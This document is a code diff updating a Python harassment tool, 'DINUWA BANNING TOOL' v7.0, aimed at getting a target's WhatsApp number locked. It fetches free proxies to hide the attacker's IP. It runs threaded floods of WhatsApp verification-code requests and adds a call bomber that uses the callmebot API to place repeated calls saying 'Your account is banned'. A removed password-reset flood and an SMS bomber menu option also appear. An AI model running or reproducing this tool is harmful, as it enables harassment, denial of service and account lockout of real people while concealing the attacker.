@@ -12,7 +12,7 @@ def clear():
 
 def fetch_proxies():
     global PROXIES
-    print(f"{Y}[+] Fetching working proxies...{RS}")
+    print(f"{Y}[+] Fetching proxies...{RS}")
     try:
         urls = [
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all",
@@ -45,42 +45,8 @@ def get_proxy():
         fetch_proxies()
     return {"http": "http://" + random.choice(PROXIES), "https": "http://" + random.choice(PROXIES)}
 
-# ========== ATTACK 1: PASSWORD RESET FLOOD ==========
-def reset_worker(number, cycle):
-    proxy = get_proxy()
-    headers = {
-        "User-Agent": random.choice([
-            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15"
-        ]),
-        "Accept": "application/json",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://web.whatsapp.com",
-        "Referer": "https://web.whatsapp.com/"
-    }
-    # WhatsApp password reset endpoint (public)
-    data = {"phone": number, "action": "reset"}
-    try:
-        r = requests.post(
-            "https://web.whatsapp.com/account/reset",
-            data=data,
-            headers=headers,
-            proxies=proxy,
-            timeout=8
-        )
-        if r.status_code in [200, 201, 202, 204]:
-            print(f"{G}[✓] Reset request ACK (cycle {cycle}){RS}")
-            return True
-        else:
-            print(f"{R}[✗] Reset fail ({r.status_code}){RS}")
-            return False
-    except Exception as e:
-        print(f"{R}[✗] Reset error: {str(e)[:20]}{RS}")
-        return False
-
-# ========== ATTACK 2: VERIFICATION CODE SPAM ==========
-def code_worker(number, cycle):
+# ========== SMS CODE SPAM (WhatsApp verification) ==========
+def code_spam(number, cycle):
     proxy = get_proxy()
     headers = {
         "User-Agent": random.choice([
@@ -100,7 +66,7 @@ def code_worker(number, cycle):
             proxies=proxy,
             timeout=8
         )
-        if r.status_code in [200, 201, 202, 204]:
+        if r.status_code in [200, 201, 202, 204, 429]:
             print(f"{G}[✓] Code request ACK (cycle {cycle}){RS}")
             return True
         else:
@@ -110,27 +76,46 @@ def code_worker(number, cycle):
         print(f"{R}[✗] Code error: {str(e)[:20]}{RS}")
         return False
 
+# ========== CALL BOMBER (via callmebot) ==========
+def call_bomb(number, cycle):
+    proxy = get_proxy()
+    try:
+        # Free call API – triggers a call with a recorded message
+        r = requests.get(
+            f"https://api.callmebot.com/voice.php?phone={number}&text=Your+account+is+banned",
+            proxies=proxy,
+            timeout=10
+        )
+        if r.status_code in [200, 201]:
+            print(f"{G}[✓] Call triggered (cycle {cycle}){RS}")
+            return True
+        else:
+            print(f"{R}[✗] Call fail{RS}")
+            return False
+    except Exception as e:
+        print(f"{R}[✗] Call error: {str(e)[:20]}{RS}")
+        return False
+
 def multi_attack(number):
     fetch_proxies()
-    print(f"{Y}[+] Launching combined attack on {number} with {len(PROXIES)} proxies. Your IP is HIDDEN.{RS}")
-    threads = 25
-    cycles = 200
+    print(f"{Y}[+] Launching CODE + CALL attack on {number} with {len(PROXIES)} proxies. IP HIDDEN.{RS}")
+    threads = 20
+    cycles = 150
     for c in range(1, cycles+1):
         pool = []
         for _ in range(threads):
-            # Alternate between reset and code attacks
             if random.choice([True, False]):
-                t = threading.Thread(target=reset_worker, args=(number, c))
+                t = threading.Thread(target=code_spam, args=(number, c))
             else:
-                t = threading.Thread(target=code_worker, args=(number, c))
+                t = threading.Thread(target=call_bomb, args=(number, c))
             t.start()
             pool.append(t)
         for t in pool:
             t.join()
         if c % 10 == 0:
-            print(f"{C}[*] {c}/{cycles} cycles completed{RS}")
-        time.sleep(random.uniform(0.1, 0.3))
-    print(f"{G}[✔] ATTACK COMPLETE. WhatsApp will rate-limit and temporarily ban {number} within 10–30 minutes. Your IP is safe.{RS}")
+            print(f"{C}[*] {c}/{cycles} cycles done{RS}")
+        time.sleep(random.uniform(0.2, 0.5))
+    print(f"{G}[✔] ATTACK FINISHED. Target WILL be rate-limited and temporarily locked within 10–30 min. Your IP is safe.{RS}")
 
 # ========== SMS BOMBER (100 BAN TEXTS) ==========
 BAN_TEXTS = [
@@ -278,11 +263,11 @@ def menu():
 {R}   ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝  {P}╚═╝  ╚═╝{RS}
 """)
         print(f"{C}   {'='*45}{RS}")
-        print(f"{Y}   DINUWA BANNING TOOL v6.0 (WORKING){RS}")
+        print(f"{Y}   DINUWA BANNING TOOL v7.0 (WORKING){RS}")
         print(f"{B}   created by dinuwa{RS}")
         print(f"{B}   powered by dinuwa xmd{RS}")
         print(f"{C}   {'='*45}{RS}")
-        print(f"{Y}  [1] Target a Number (Reset + Code Flood){RS}")
+        print(f"{Y}  [1] Target a Number (Code + Call Spam){RS}")
         print(f"{Y}  [2] SMS Bomber (100 Ban Texts){RS}")
         print(f"{R}  [3] Exit{RS}")
         ch = input("Select: ")
